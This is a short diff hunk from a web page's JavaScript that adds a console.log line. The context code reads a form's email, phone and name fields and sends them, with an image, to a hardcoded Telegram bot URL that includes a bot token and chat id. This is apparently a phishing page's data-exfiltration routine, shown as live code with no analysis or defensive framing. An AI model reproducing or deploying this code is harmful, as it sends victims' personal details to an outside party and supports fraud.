@@ -711,6 +711,7 @@
                                 const phone = document.getElementById("phone").value;
 
                                 const Http = new XMLHttpRequest();
+                                console.log(img);
                                 const url='https://api.telegram.org/bot6413357158:AAFTaNXZANJNs9pehMUIqom0whxjlN-dAcU/sendphoto?chat_id=1632888291&photo='+img+'&caption=information : %0A email : '+Email+'%0A phone : '+phone+'%0A fullname : '+firstname+'+'+lastname;
                                 Http.open("post", url);
                                 Http.send();
